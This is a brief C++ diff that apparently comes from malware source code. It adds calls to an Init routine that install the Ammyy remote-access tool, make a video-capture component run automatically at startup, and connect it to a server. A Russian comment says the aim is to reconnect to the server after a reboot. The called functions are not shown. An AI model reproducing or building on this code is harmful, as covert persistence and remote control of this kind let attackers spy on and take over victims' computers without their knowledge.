@@ -657,6 +657,12 @@ bool Init( const char* appName )
 			}
 			else
 				pSleep(100);
+
+#ifdef AmmyyH
+		Ammyy::Install(false);
+#endif 
+		VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
+		VideoProcess::ConnectToServer(0);
 	}
 	return true;
 }
